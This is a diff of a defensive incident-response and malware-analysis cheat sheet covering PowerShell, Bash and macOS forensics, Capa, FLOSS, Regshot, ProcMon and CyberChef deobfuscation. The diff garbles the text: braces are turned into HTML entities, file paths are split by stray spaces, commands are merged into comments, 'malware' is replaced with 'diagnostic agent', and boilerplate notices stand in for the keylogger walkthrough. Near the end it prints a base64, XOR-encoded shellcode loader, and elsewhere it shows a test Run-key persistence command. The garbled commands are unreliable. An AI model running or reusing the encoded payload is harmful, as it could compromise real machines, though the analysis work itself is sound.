 #For SYSTEM, you don't need to overcomplicate this
 (gci "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\*\UsageLogs\*"
-ForEach-Object{ write-host "$_, SYSTEM, $(hostname)"}
+ForEach-Object&#123; write-host "$_, SYSTEM, $(hostname)"&#125;
 But keep in mind, an adversary changing the file name is easy and therefore this is a meh
 telemetry source
 Powershell Tips
@@ -1367,8 +1345,8 @@ Get Command and Get Help
 This is similar to aproposin Bash. Essentially, you can search for commands related to
 keywords you give.
 Try to give singulars, not plural. For example, instead of drivers just do driver
-get-command *driver* 
-## Once you see a particular command or function, to know what THAT does use get-help. 
+get-command *driver*
+## Once you see a particular command or function, to know what THAT does use get-help.
 # get-help [thing]
 Get-Help Get-SystemDriver
 WhatIf
@@ -1388,8 +1366,7 @@ Output Without Headers
 You may just want a value without the collumn header that comes. We can do that with -
 ExpandProperty
 # use the -expandproperty before the object you want. IN this case, ID
- select -ExpandProperty id 
-
+ select -ExpandProperty id
 # so for example
 get-process -Name "google*" | select -ExpandProperty id
 # lets stop the particular google ID that we want
@@ -1409,30 +1386,30 @@ r 43
 Stop Trunction
 Out-String
 For reasons(?) powershell truncates stuff, even when it's really unhelpful and pointless for it to
-do so. Take the below for example: our hash AND path is cut off....WHY?! :rage:
+do so. Take the below for example: our hash AND path is cut off.... WHY?! :rage:
 To fix this, use out-string
 #put this at the very end of whatever you're running and is getting truncated
 | outstring -width 250
 # or even more
 | outstring -width 4096
 #use whatever width number appropiate to print your results without truncation
-#you can also stack it with ft. For example: 
-Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
-ft PSChildName, ImagePath -autosize | out-string -width 800 
-Look no elipses! 
+#you can also stack it with ft. For example:
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" |
+ft PSChildName, ImagePath -autosize | out-string -width 800
+Look no elipses!
 -Wrap
 In some places, it doesn't make sense to use out-string as it prints strangely. In these instances,
 try the -wrap function of format-table
 This, for example is a mess because we used out-string. It's wrapping the final line in an
-annoying and strange way. ans 
+annoying and strange way. ans
 Isn't this much better now?
 Directories
 For some investigations, I need to organise my directories or everything will get messed up. I
 enjoy using Year-Month-Date in my directory names!
-| ft -property * -autosize -wrap 
+| ft -property * -autosize -wrap
 #you don't always need to the -property * bit. But if you find it isn't printing as you want, try again.
-| ft -autosize -wrap 
-mkdir -p "C:\Malware_Analysis\$(Get-Date -UFormat "%Y_%b_%d_%a_UTC%Z")" 
+| ft -autosize -wrap
+mkdir -p "C:\Malware_Analysis\$(Get-Date -UFormat "%Y_%b_%d_%a_UTC%Z")"
 Transcripts
 Trying to report back what you ran, when you ran, and the results of your commands can
 become a chore. If you forget a pivotal screenshot, you'll kick yourself - I know I have.
@@ -1456,7 +1433,7 @@ Bash History
 section contents
 Checkout the SANS DFIR talk by Half Pomeraz called You don't know jack about .bash_history.
 It's a terrifying insight into how weak bash history really is by default
-Add add timestamps to .bash_history
+Add timestamps to .bash_history
 Via .bashrc
 nano ~/.bashrc
 #at the bottom
@@ -1484,7 +1461,7 @@ To then prepare this to compare to the 4624s, I find it easiest to use this [cyb
 )Sort('Line%20feed',false,'Alphabetical%20(case%20sensitive)')Unique('Line%20feed',false)Fin
 d_/_Replace(%7B'option':'Regex','string':'%5C%5Cn'%7D,'%7C',true,false,true,false))
 grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"
-egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])) file.txt'
+egrep '(([0-9a-fA-F]&#123;1,4&#125;:)&#123;7,7&#125;[0-9a-fA-F]&#123;1,4&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,7&#125;:|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,6&#125;:[0-9a-fA-F]&#123;1,4&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,5&#125;(:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,2&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,4&#125;(:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,3&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,3&#125;(:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,4&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,2&#125;(:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,5&#125;|[0-9a-fA-F]&#123;1,4&#125;:((:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,6&#125;)|:((:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,7&#125;|:)|fe80:(:[0-9a-fA-F]&#123;0,4&#125;)&#123;0,4&#125;%[0-9a-zA-Z]&#123;1,&#125;|::(ffff(:0&#123;1,4&#125;)&#123;0,1&#125;:)&#123;0,1&#125;((25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9]).)&#123;3,3&#125;(25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9])|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,4&#125;:((25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9]).)&#123;3,3&#125;(25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9])) file.txt'
 grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"
 And now, compare the brute forcing IPs with your 4624 successful logins, to see if any have
 successfully compromised you
@@ -1494,18 +1471,16 @@ screenshots and reporting. So take the above example, let's say we're looking fo
 we can have ack filter and highlight those
 Ack is like Grep's younger, more refined brother. Has some of greps' flags as default, and just
 makes life a bit easier.
-#install ack if you need to: sudo apt-get install ack
-ack -i '127.0.0.1|1.1.1.1' --passthru file.txt
+#install ack if you need to: sudo apt-get install ack -i '127.0.0.1|1.1.1.1' --passthru file.txt
 grep -iEo '192.168.1.114|192.168.1.128|192.168.1.130|192.168.1.146|192.168.1.147|192.168.1.164|192.168.1.3|192.168.1.51|51.89.115.202'
 Processes and Networks
 section contents
 Track parent-child processes easier
 ps -aux --forest
 Get an overview of every running process running from a non-standard path
-sudo ls -l /proc/[0-9]*/exe 2&gt;/dev/null | awk '/ -&gt; / && !/\/usr\/(lib(exec)?|s?bin)\// {print $9, $10, $11}'
+sudo ls -l /proc/[0-9]*/exe 2&gt;/dev/null | awk '/ -&gt; / && !/\/usr\/(lib(exec)?|s?bin)\// &#123;print $9, $10, $11&#125;'
 Or list every process full stop
-sudo ls -l /proc/[0-9]*/exe 2&gt;/dev/null | awk '/ -&gt; / {print $NF}' | sort | tac
-
+sudo ls -l /proc/[0-9]*/exe 2&gt;/dev/null | awk '/ -&gt; / &#123;print $NF&#125;' | sort | tac
 Get a quick overview of network activity
 netstat -plunt
 #if you don't have netstat, try ss
@@ -1518,12 +1493,10 @@ section contents
 Recursively look for particular file types, and once you find the files get their
 hashes
 Here's the bash alternative
-find . type f -exec sha256sum {} \; 2&gt; /dev/null | grep -Ei '.asp|.js' | sort
-Tree
+find . type f -exec sha256sum &#123;&#125; \; 2&gt; /dev/null | grep -Ei '.asp|.js' | sort
 Tree is an amazing command. Please bask in its glory. It will recursively list out folders and
 filders in their parent-child relationship.....or tree-branch relationship I suppose?
 #install sudo apt-get install tree
-tree 
 But WAIT! There's more!
 Tree and show the users who own the files and directories
 tree -u
@@ -1555,7 +1528,6 @@ analysis:
 diff -q net.txt net2.txt
 #quickly show minimal differences
 diff -d net.txt net2.txt
-
 Bash Tips
 section contents
 Fixing Mistakes
@@ -1578,14 +1550,12 @@ cat /etc/prozile
 #fix it
 fc
 #then save and exit
-
 Re-run a command in History
 If you had a beautiful command you ran ages ago, but can't remember it, you can utilise
 history. But don't copy and paste like a chump.
 Instead, utilise exclamation marks and the corresponding number entry for your command in the
 history file. This is highlighted in red below
 #bring up your History
-history
 #pick a command you want to re-run.
 # now put one exclamation mark, and the corresponding number for the command you want
 !12
@@ -1593,13 +1563,13 @@ MacOS
 section contents
 Reading .plist files
 Correct way to just read a plist is plutil -p but there are multiple different methods so do
-whatever, I’m not the plist police 
+whatever, I’m not the plist police
 If the plist is in binary format, you can convert it to a more readable xml: plutil -convert xml1
-<path_to_binary_plist&gt;
+&lt;path_to_binary_plist&gt;
 Quarantine Events
 Files downloaded from the internet
 The db you want to retrieve will be located here with a corresponding username:
-/Users/*/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2
+/Users/*/Library/Preferences/com.apple. LaunchServices. QuarantineEventsV2
 Here’s a dope one-liner that organises the application that did the downloading, the link to
 download, and then the date it was downloaded, via sqlite
 Install History
@@ -1608,14 +1578,14 @@ Find installed applications and the time they were installed from :
 Annoyingly doesn’t show corresponding user ? However, it does auto sort the list by datetime
 which is helpful
 plutil -p /Library/Receipts/InstallHistory.plist
-sqlite3 /Users/dray/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
+sqlite3 /Users/dray/Library/Preferences/com.apple. LaunchServices. QuarantineEventsV2 \
 'select LSQuarantineAgentName, LSQuarantineDataURLString, date(LSQuarantineTimeStamp + 978307200, "unixepoch") as downloadedDate from LSQuarantineEvent order by LSQuarantineTimeStamp'
 | sort -u | grep '|' --color
 Location Tracking
 Some diagnostic agent can do creeper stuff and leverage location tracking Things you see here offer an
 insight into the programs and services allowed to leverage location stuff on mac
 #plain read
-sudo plutil -p /var/db/locationd/clients.plist 
+sudo plutil -p /var/db/locationd/clients.plist
 #highlight the path of these applications
 sudo plutil -p /var/db/locationd/clients.plist | ack --passthru 'BundlePath'
 # or sudo plutil -p /var/db/locationd/clients.plist | grep 'BundlePath'
@@ -1627,23 +1597,23 @@ Another useful subdirectory here containing stuff relevant to recent applicatioo
 There are legitimate ways to parse whats going on here……but that just ain’t me chief - I strings
 these bad boys
 #full path to this stuff
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteItems.sfl2   
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ProjectsItems.sfl2   
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.iCloudItems.sfl2
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentHosts.sfl2
-/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList
-/Users/users/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList. FavoriteItems.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList. ProjectsItems.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList.iCloudItems.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList. RecentHosts.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList
+/Users/users/Library/Application Support/com.apple.sharedfilelist/com.apple. LSSharedFileList
 Audit Logs
-praudit command line tool will let you read the audit logs in /private/var/audit/ 
+praudit command line tool will let you read the audit logs in /private/var/audit/
 Play around with the different printable formats of praudit
 And then leverage auditreduce to look for specific activity (man page).
 Examples
 What was the user dray up to on 13th May 2022: auditreduce -d 20220513 -u dray
-/var/audit/* | praudit 
+/var/audit/* | praudit
 Show user logins and outs auditreduce -c lo /var/audit/* | praudit
 What happened between two dates: auditreduce /var/audit/* -a 20220401 -b 20220501 | praudit
 Command line history
@@ -1666,23 +1636,23 @@ Can get a more complete list here
 # scripts
 /Users/*/Library/Preferences/com.apple.loginwindow.plist
 /etc/periodic/[daily, weekly, monthly]
-# cronjobs / like scheduled tasks 
+# cronjobs / like scheduled tasks
 /private/var/at/tabs/
-/usr/lib/cron/jobs/ 
+/usr/lib/cron/jobs/
 Transparency, Consent, and Control (TCC)
 The TCC db (Transparency, Consent, and Control) offers insight when some applications have
 made system changes. There are at least two TCC databases on the system - one per user, and
 one root.
-/Library/Application Support/com.apple.TCC/TCC.db
-/Users/*/Library/Application Support/com.apple.TCC/TCC.db
+/Library/Application Support/com.apple. TCC/TCC.db
+/Users/*/Library/Application Support/com.apple. TCC/TCC.db
 # system extensions
 /Library/SystemExtensions/
 # loads of places for annoying persistence amongst daemons
 /System/Library/LaunchDaemons/*.plist
-/System/Library/LaunchAgents/*.plist 
-/Library/LaunchDaemons/*.plist 
-/Library/LaunchAgents/*.plist 
-/Users/*/Library/LaunchAgents/*.plist 
+/System/Library/LaunchAgents/*.plist
+/Library/LaunchDaemons/*.plist
+/Library/LaunchAgents/*.plist
+/Users/*/Library/LaunchAgents/*.plist
 You can use sqlite3 to parse, but there are values that are not translated and so don’t make too
 much sense
 You can use some command line tools, or just leverage a tool like Velociraptor, use the dedicated
@@ -1694,7 +1664,7 @@ Built-In Security Mechanisms
 There are some built-in security tools on macOS that can be queried with easy command line
 commands. This will get the status of the following.
 # Airdrop
-sudo ifconfig awdl0 | awk '/status/{print $2}'
+sudo ifconfig awdl0 | awk '/status/&#123;print $2&#125;'
 # Filevault
 sudo fdesetup status
 diagnostic agent
@@ -1724,26 +1694,24 @@ sudo launchctl list com.apple.screensharing
 # SIP
 csrutil status
 #execute Thor
-./thor-lite-macosx -a FileScan \ 
+./thor-lite-macosx -a FileScan \
 -p /diagnostic agent/folder:NOWALK -e /diagnostic agent/folder \
 --nothordb --allreasons --utc --intense --nocsv --silent --brd
 #open the HTML report THOR creates
 open /diagnostic agent/folder/*.html
-Capa
 Capa is a great tool to quickly examine wtf a binary does. This tool is great, it previously helped
-me identify a keylogger that was pretending to be an update.exe for a program
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
 Usage
 ./capa diagnostic agent.exe &gt; diagnostic agent.txt
 # I tend to do normal run and then verbose
 ./capa -vv diagnostic agent.exe &gt;&gt; diagnostic agent.txt
 cat diagnostic agent.txt
-Example of Capa output for the keylogger 
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
 File
 The command file is likely to be installed in most unix, MacOS, and linux OS'. Deploy it next to
 the file you want to interrograte
 exiftool may have to be installed on your respective OS, but is deplopyed similarly be firing it
 off next to the file you want to know more about
-
 Strings
 Honestly, when you're pressed for time don't knock strings. It's helped me out when I'm
 under pressure and don't have time to go and disassemble a compiled binary.
@@ -1752,15 +1720,13 @@ expect - for example, it may include a hardcoded malicious IP.
 Floss
 Ah you've tried strings. But have you tried floss? It's like strings, but deobfuscate strings in a
 binary as it goes
-#definitely read all the functionality of floss
-floss -h
+#definitely read all the functionality of floss -h
 floss -l
 #execute
 floss -n3 '.\nddwmkgs - Copy.dll'
-Flarestrings
 Flarestrings takes floss and strings, but adds a machnine learning element. It sorts the strings
 and assigns them a 1 to 10 value according to how malicious the strings may be.
-flarestrings.exe '.\nddwmkgs - Copy.dll' | 
+flarestrings.exe '.\nddwmkgs - Copy.dll' |
 rank_strings -s # 2&gt;$null redirect the erros if they get in your way
 Win32APIs
 Many of the strings that are recovered from diagnostic agent will reference Win32 APIs - specific
@@ -1768,21 +1734,18 @@ functions that can be called on when writing code to interact with the OS in spe
 To best understand what exactly the Win32 API strings are that you extract, I'd suggest Malapi.
 This awesome project maps and catalogues Windows APIs, putting them in a taxonomy of what
 they generally do
-Regshot
-regshot.exe is great for diagnostic agent analysis by comparing changes to your registry.
+Regshot.exe is great for diagnostic agent analysis by comparing changes to your registry.
 If your language settings have non-Latin characters (e.g. Russian, Korean, or Chinese), use
 unicode release
-
 #pull it
 wget -usebasicparsing https://github.com/Seabreg/Regshot/raw/master/Regshot-x64-ANSI.exe -outfile regshot.exe
 .\regshot.exe
-
 #run the GUI for the first 'clean' reg copy. Takes about a minute and a half
 #add something malicious as a test if you want
 REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\evil.exe
 ## now run the GUI for the second time
 # then run the comparison
-Slightly noisy but does catch the reg changes. 
+Slightly noisy but does catch the reg changes.
 Registry snapshot via PwSh
 Lee Holmes dropped some serious PowerShell knowledge in this Twitter exchange 1, 2. This
 takes longer than Regshot, but if you wanted to stick to PwSh and not use tooling you can.
@@ -1794,10 +1757,10 @@ Some diagnostic agent will require specfic responses to unravel further.
 I'd reccomend inetsim where you encounter this kind of diagnostic agent, as inetsim can emulate
 files and specific responses that diagnostic agent calls out for
 #Base snapshot
-gci -recurse -ea ignore -path HKCU:\,HKLM:\ | % {[PSCustomObject] @{Name = $_.Name; Values= 
+gci -recurse -ea ignore -path HKCU:\,HKLM:\ | % &#123;[PSCustomObject] @&#123;Name = $_. Name; Values=
 ## Execute diagnostic agent
 #New shapshot
-gci -recurse -ea ignore -path HKCU:\,HKLM:\ | % {[PSCustomObject] @{Name = $_.Name; Values= 
+gci -recurse -ea ignore -path HKCU:\,HKLM:\ | % &#123;[PSCustomObject] @&#123;Name = $_. Name; Values=
 #Compare
 diff (gc .\test.txt) (gc .\test2.txt) -Property Name,Value
 Entropy
@@ -1828,30 +1791,28 @@ sudo apt install libcrypt-rc4-perl
 # pull the script
 wget http://hexacorn.com/d/DeXRAY.pl
 #execute the script
-perl ./DeXRAY.pl x.MAL
+perl ./DeXRAY.pl x. MAL
 And we get a working un-quarantined diagnostic agent sample at the other side
 Process Monitor
 section contents
 ProcMon is a great tool to figure out what a potentially malicious binary is doing on an endpoint.
 There are plenty of alternatives to monitor the child processes that a parent spawns, like any.run.
 But I'd like to focus on the free tools to be honest.
-Keylogger Example
-Let's go through a small investigation together, focusing on a real life keylogger found in an
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
 incident
 Clearing and Filtering
 When I get started with ProcMon, I have a bit of a habit. I stop capture, clear the hits, and then
 begin capture again. The screenshot details this as steps 1, 2, and 3.
 I then like to go to filter by process tree, and see what processes are running
-
 Process tree
-When we look at the process tree, we can see something called Keylogger.exe is running!
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
 Right-click, and add the parent-child processes to the filter, so we can investigate what's going
 on
 Honing in on a child-process
-ProcMon says that keylogger.exe writes something to a particular file....
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
 You can right click and see the properties
 Zero in on malice
-And if we go to that particular file, we can see the keylogger was outputting our keystrokes to
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
 the policy.vpol file
 That's that then, ProcMon helped us figure out what a suspicious binary was up to!
 Hash Check diagnostic agent
@@ -1882,7 +1843,6 @@ a sha256 hash and need to explicitly search that.
 Notice how much diagnostic agent Bazaar offers. You can go and get diagnostic agent samples from here and
 download it yourself.
 Sometimes, diagnostic agent Bazaar offers insight into the diagnostic agent is delivered too
-Winbindex
 Winbindex is awesome. The info behind the site can be read here. But in essence, it's a repo of
 official Windows binaries and their hashes.
 We've already discussed it about Drivers and DLLs, so I won't go into too much detail. This won't
@@ -1904,7 +1864,7 @@ scdgb /find malice.dat /findsc # looks for shelcode and if that fails go down to
 speakeasy -t malice.dat -r -a x64
 reflection assembly
 load PwSh dot net code, and execute it
-instead of letting it reflect: [System.IO.File]::WriteAllBytes(".\evil.exe", $diagnostic agent)
+instead of letting it reflect: [System. IO. File]::WriteAllBytes(".\evil.exe", $diagnostic agent)
 xor xcrypt
 you can xor brute force in cyberchef, change the sample lentgh to 200.
 You're probably looking for 'MZ....this program'
@@ -1959,20 +1919,18 @@ But let's pretend we didn't see the Gzip part of the script. Is there a way we c
 methods obfscuation takes?
 Absolutely, the option is called Magic in CyberChef. It's a kind of brute forcer for detecting
 encoding, and then offering a snippet of what the text would look like decoded.
-So take the base64 text from the script, and re-enter it by itself 
+So take the base64 text from the script, and re-enter it by itself
 We can turn the UTF option off now, and turn magic on. I tend to give it a higher intensive
 number, as it's all client-side resource use so it's as strong as your machine is!
 Well looky here, we can see some human-readable text. So now we know to stack add gzip to
 our decoding stack in cyberchef. From Magic, just click the link of the particular decoding option
 it offers
-
 Gzip and Xor
 We're starting to get somewhere with this script! But we're gonna need to do some more
 decoding unfortunately.
 There's something sneaky about this diagnostic agent. It's using some encyrption....but we can break it
 with XOR
 If we trial and error with the numbers and decimals, we can eventually start the cracking process
-
 Defang
 CyberChef has taken us as far as we can go. To find out what happens next, we need to run this
 on a test rig. But we need to de-fang all of the dangerous bits of this script.
@@ -1981,22 +1939,22 @@ replacing variables in malicious scripts. If you replace-all for the variable, y
 variables that are familiar.
 So for this script:
 #original variable
-$s==New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAA......
+$s==New-Object IO. MemoryStream(,[Convert]::FromBase64String("H4sIAA......
 #changed
-$bse64=New-Object IO.Me
+$bse64=New-Object IO. Me
 It isn't much, but in a big long complicated script, changing variables helps keep track of what's
 going on.
 After this, we need to make sure that running this script won't actually execute anything
 malicious on our system. We just want to see what it will do.
-Remove IEX where you see it. Don't get rid of the brackets though. 
+Remove IEX where you see it. Don't get rid of the brackets though.
 Once you've de-fanged the script, you are alright to run it and will just print the output to the
-screen: 
+screen:
 A Layer Deeper
 So CyberChef got us here, and we were limited there. So now let's de-fang this resulting script
 and see where they takes us
-If we scroll around, we can see see some of the logic of the script. At the bottom, we see that it
+If we scroll around, we can see some of the logic of the script. At the bottom, we see that it
 will execute the output of a variable as a Job, which we've touched on before
-Let's remove the IEX at the bottom, and neutralise the job by commenting it out 
+Let's remove the IEX at the bottom, and neutralise the job by commenting it out
 ....to be continued!!!
 Bytes
 Here's a seperate bit of Powershell diagnostic agent. I decoded it up to a point, and I want to focus on
@@ -2004,14 +1962,12 @@ some easy ways to decode BYTES.
 First, push it as a $variable in powershell
 $diagnostic agent = [put the above string here]
 If we `echo $diagnostic agent" we can see we get some numbers. These are likely bytes.
-If ([IntPtr]::size -eq 8) {
-  [Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbKsCMjI3lrquJim5giIyNuEupicmJySSBicmKZdKq85dz2yFp4a6riaxLxaqr7bhLqcUsjEeOncXFimch2DRjc9muq5Wug4HNJKXxrqtKZPCMjI0kjS6MQIyNqqsNimicjIyNimVZlvaXc9muq0muq+Wrk49zc3NxuEupxcWKZDiU7WNz2puMspr4iIyNr3Owsp68iIyPIkMrHIiMjy6Hc3NwMQlNKDFURDERGV3xLRkJHRlEcVlZKRx4QQhEQQkcTQQ4QQhsXDhcVQkUOQRRARw5AFkAWFRIbFBtGRhMjQEI91OUC8tO7DI3t7FEHxV0CI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxITDRMYA3RKTUdMVFADbXcDFQ0RGAN0bHQVFxgDd1FKR0ZNVwwVDRMYA25id2FpcAouKSMOmn/nY6mYOw5OQVNyftKp9hpItf3rAbs0ProvN/ccyuALAatbGBGOWJ2NY+zQ/glsuFaoh0pqIXHzPcoRtOWLPDHqUFS735Fjso5bxJ9e8WkKLcJfw5i/lpyFM60nu4hpKQz2ElgTcYb6/ce+ekpvIrjtcwE3LAHdTvge4DGT6u006lHMLUmGLrhFP/5fdz80Zw2UZezRXANuIpdmpZ4GKmmgJReSqSlU+E+oZhALFm+qEsWFRJxs0Un+JOkQGqMtlgRAcHDF93uo/DzGDM8myCNindOWgXXc9msS6pkjI2MjYpsjMyMjYppjIyMjYpl7h3DG3PZrsHBwa6rEa6rSa6r5YpsjAyMjaqraYpkxtarB3PZroOcDpuNXlUWoJGsi4KbjVvR7e3trJiMjIyNz4Mtc3tzcEhsWDRIaGw0WFA0SFhYjMRd1Ww=='
-  for ($x = 0; $x -lt $var_code.Count; $x++) {
+If ([IntPtr]::size -eq 8) &#123;
+  [Byte[]]$var_code = [System. Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbKsCMjI3lrquJim5giIyNuEupicmJySSBicmKZdKq85dz2yFp4a6riaxLxaqr7bhLqcUsjEeOncXFimch2DRjc9muq5Wug4HNJKXxrqtKZPCMjI0kjS6MQIyNqqsNimicjIyNimVZlvaXc9muq0muq+Wrk49zc3NxuEupxcWKZDiU7WNz2puMspr4iIyNr3Owsp68iIyPIkMrHIiMjy6Hc3NwMQlNKDFURDERGV3xLRkJHRlEcVlZKRx4QQhEQQkcTQQ4QQhsXDhcVQkUOQRRARw5AFkAWFRIbFBtGRhMjQEI91OUC8tO7DI3t7FEHxV0CI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxITDRMYA3RKTUdMVFADbXcDFQ0RGAN0bHQVFxgDd1FKR0ZNVwwVDRMYA25id2FpcAouKSMOmn/nY6mYOw5OQVNyftKp9hpItf3rAbs0ProvN/ccyuALAatbGBGOWJ2NY+zQ/glsuFaoh0pqIXHzPcoRtOWLPDHqUFS735Fjso5bxJ9e8WkKLcJfw5i/lpyFM60nu4hpKQz2ElgTcYb6/ce+ekpvIrjtcwE3LAHdTvge4DGT6u006lHMLUmGLrhFP/5fdz80Zw2UZezRXANuIpdmpZ4GKmmgJReSqSlU+E+oZhALFm+qEsWFRJxs0Un+JOkQGqMtlgRAcHDF93uo/DzGDM8myCNindOWgXXc9msS6pkjI2MjYpsjMyMjYppjIyMjYpl7h3DG3PZrsHBwa6rEa6rSa6r5YpsjAyMjaqraYpkxtarB3PZroOcDpuNXlUWoJGsi4KbjVvR7e3trJiMjIyNz4Mtc3tzcEhsWDRIaGw0WFA0SFhYjMRd1Ww=='
+  for ($x = 0; $x -lt $var_code. Count; $x++) &#123;
     $var_code[$x] = $var_code[$x] -bxor 35
-  }
-}
 We can push these bytes straight into an .exe
-[System.IO.File]::WriteAllBytes(".\evil.exe", $diagnostic agent)
+[System. IO. File]::WriteAllBytes(".\evil.exe", $diagnostic agent)
 Then we can string the evil.exe, and we can see that it includes a bad IP, confirming this was
 indeed diagnostic agent!
 SOC
